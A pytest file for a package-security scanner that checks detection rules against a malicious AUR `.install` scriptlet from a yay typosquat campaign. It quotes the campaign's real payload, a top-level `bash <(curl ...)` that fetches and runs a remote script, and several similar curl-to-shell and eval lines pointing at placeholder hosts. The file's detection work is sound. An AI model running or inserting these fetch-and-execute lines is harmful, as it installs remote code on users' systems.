"""Install scriptlet manifest rules: H090 process substitution, C032.

The yay typosquat campaign (yyay, yaay, yayy, maintainer impersonating
Jguer) shipped a committed `.install` whose hook functions were inert and
whose payload sat outside every function as a bare process substitution:

    bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/...')

Two gaps came out of replaying that file: H090's committed-carrier payload
pattern was pipe-keyed and read `bash <(curl ...)` as nothing, and no rule
read scriptlet content outside the hook functions at all (H017 and C016
both scope to function bodies, and the scope map omits top-level lines).
These tests pin both fixes and their must-not-fire surfaces.

The fixture below is the campaign's real `yyay.install`, byte-identical
across the three clones, fetched from the watcher snapshot API.
"""

import pytest

from trustsight.analysis.delivery import scan_tree_manifest
from trustsight.analysis.edges import edge_scriptlet_top_level_execution

from .helpers import _ids

REAL_YYAY_INSTALL = """post_install() {
  true
}

post_upgrade() {
  post_install
}

bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
"""

TOP_LEVEL_LOCAL_EXEC = """post_install() {
  echo hi
}

bash /usr/local/bin/x.sh
"""

BENIGN_HOOKS_ONLY = """post_install() {
  true
}

post_upgrade() {
  post_install
}
"""

BENIGN_TOP_LEVEL_ASSIGNMENT = """FOO=bar
post_install() {
  echo installed
}
"""


def _manifest_findings(name, text):
    return scan_tree_manifest([(name, text.encode())], [], "yyay")


# --- H090: process substitution in a committed carrier ---------------


def test_h090_fires_on_real_yyay_install_payload():
    """Regression: the campaign file scored zero findings before the
    process-substitution arms existed."""
    findings = _manifest_findings("yyay.install", REAL_YYAY_INSTALL)
    hits = [f for f in findings if f["rule_id"] == "H090"]
    assert len(hits) == 1
    assert hits[0]["severity"] == "CRITICAL"
    assert "yyay.install" in hits[0]["match"]


def test_h090_fires_on_process_substitution_in_each_carrier():
    body = "post_install() {\n  true\n}\n\nbash <(curl -L https://e.example/x.sh)\n"
    for name in ("x.install", "x.hook", "x.service", "x.rules"):
        findings = _manifest_findings(name, body)
        assert any(f["rule_id"] == "H090" for f in findings), name


def test_h090_still_fires_on_pipe_shape():
    body = "post_install() {\n  curl https://e.example/x.sh | bash\n}\n"
    findings = _manifest_findings("x.install", body)
    assert [f["rule_id"] for f in findings] == ["H090"]
    assert findings[0]["severity"] == "CRITICAL"


def test_h090_does_not_claim_pkgbuild_build_functions():
    """The manifest scan reads carriers, not the recipe: a vendor
    installer curled and piped inside build() stays R001-only."""
    body = "build() {\n  curl -fsSL https://vendor.com/install.sh | bash\n}\n"
    assert _manifest_findings("PKGBUILD", body) == []


# --- H075 diff-scope: no regression on the campaign line ---------------


def test_h075_still_fires_in_diff_window_on_campaign_line():
    diff = (
        "diff --git a/yyay.install b/yyay.install\n"
        "new file mode 100644\n"
        "--- /dev/null\n+++ b/yyay.install\n"
        "@@ -0,0 +1,7 @@\n"
        + "".join(f"+{ln}\n" for ln in REAL_YYAY_INSTALL.splitlines())
    )
    assert "H075" in _ids(diff)


# --- C032: top-level execution in a committed scriptlet ----------------


def test_c032_fires_on_real_yyay_install_payload():
    finding = edge_scriptlet_top_level_execution(
        "yyay.install", REAL_YYAY_INSTALL.encode())
    assert finding is not None
    assert finding["rule_id"] == "C032"
    assert finding["severity"] == "HIGH"
    assert finding["line"] == REAL_YYAY_INSTALL.splitlines().index(
        "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)") + 1


def test_c032_fires_on_top_level_local_execution():
    finding = edge_scriptlet_top_level_execution(
        "x.install", TOP_LEVEL_LOCAL_EXEC.encode())
    assert finding is not None
    assert finding["rule_id"] == "C032"


def test_c032_fires_on_top_level_eval():
    text = 'post_install() {\n  echo hi\n}\neval "$(curl -s https://e.example/x)"\n'
    finding = edge_scriptlet_top_level_execution("x.install", text.encode())
    assert finding is not None


def test_c032_is_silent_on_benign_hook_shapes():
    assert edge_scriptlet_top_level_execution(
        "x.install", BENIGN_HOOKS_ONLY.encode()) is None
    assert edge_scriptlet_top_level_execution(
        "x.install", BENIGN_TOP_LEVEL_ASSIGNMENT.encode()) is None


def test_c032_is_silent_on_execution_inside_hook_functions():
    """Execution inside a hook body is H017/C016's subject, not C032's."""
    text = "post_install() {\n  bash /usr/local/bin/x.sh\n}\n"
    assert edge_scriptlet_top_level_execution("x.install", text.encode()) is None


def test_c032_is_silent_on_one_liner_hook_functions():
    """A one-liner `post_install() { bash x.sh; }` runs inside the
    function; masking the definition keeps it out of the top-level scan."""
    text = "post_install() { bash /usr/local/bin/x.sh; }\n"
    assert edge_scriptlet_top_level_execution("x.install", text.encode()) is None


def test_c032_is_silent_on_non_scriptlet_carriers():
    """A unit file is read by an engine, not sourced: top-level shell is
    not executable there, so H090's carrier set does not apply."""
    text = "[Service]\nExecStart=/bin/true\n\nbash /usr/local/bin/x.sh\n"
    assert edge_scriptlet_top_level_execution("x.service", text.encode()) is None


def test_c032_stands_down_on_unparseable_partial_read():
    """A head cut by the manifest byte budget fails the whole-file parse;
    the rule reports nothing rather than a partial read."""
    truncated = "post_install() {\n  echo hi\n\nbash /usr/local/bin/x.sh\n"
    assert edge_scriptlet_top_level_execution(
        "x.install", truncated.encode()) is None


def test_scan_tree_manifest_does_not_double_fire_h090_and_c032():
    """One piece of evidence, one finding: H090 claims the campaign file
    and C032 yields, the same no-double-fire discipline as H066/H068."""
    findings = _manifest_findings("yyay.install", REAL_YYAY_INSTALL)
    assert {f["rule_id"] for f in findings} == {"H090"}


@pytest.mark.parametrize("text", [
    BENIGN_HOOKS_ONLY,
    BENIGN_TOP_LEVEL_ASSIGNMENT,
    "post_install() {\n  echo installed\n}\n",
])
def test_manifest_scan_stays_silent_on_benign_scriptlets(text):
    assert scan_tree_manifest(
        [("PKGBUILD", b"pkgname=x\n"), ("x.install", text.encode())],
        [], "x") == []
